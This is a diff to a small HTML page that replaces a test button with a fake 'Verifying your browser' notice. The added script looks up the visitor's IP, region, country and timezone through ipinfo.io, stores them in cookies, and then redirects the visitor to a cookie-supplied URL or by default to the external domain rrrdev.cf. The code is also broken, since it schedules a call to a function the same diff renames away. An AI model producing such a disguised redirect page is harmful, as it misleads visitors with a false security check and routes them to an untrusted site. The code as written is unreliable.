@@ -11,7 +11,7 @@ body {
 </style>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 <script>
-function a() {
+function vef() {
   $.getJSON('https://ipinfo.io/json', function(data) {
     var ip=data.ip;
     var rg=data.region;
@@ -22,24 +22,18 @@ function a() {
     document.cookie="co="+co;
     document.cookie="tz="+tz;
   });
-}
-if (!document.cookie.split("; ").find(r => r.startsWith("ip="))) {
-  const vef=false;
-  a();
-} else {
-  const vef=true;
-}
-function b() {
-  alert(vef);
-  if vef {
-    alert(document.cookie);
-  } else {
-    alert(vef);
+  var u=document.cookie.split('; ').find(r => r.startsWith('hr='));
+  if (!u) {
+    u = "https://rrrdev.cf/";
   }
+  window.location.href = u;
+  document.cookie = "hr=href;expires=Thu, 01 Jan 1970 00:00:00 GMT";
 }
+setTimeout(a, 5000);
 </script>
 </head>
 <body>
-<button onclick="b()">checkk</button>
+<p>Verifying your browser!<br>
+Please wait upto 5 seconds!!</p>
 </body>
 </html>
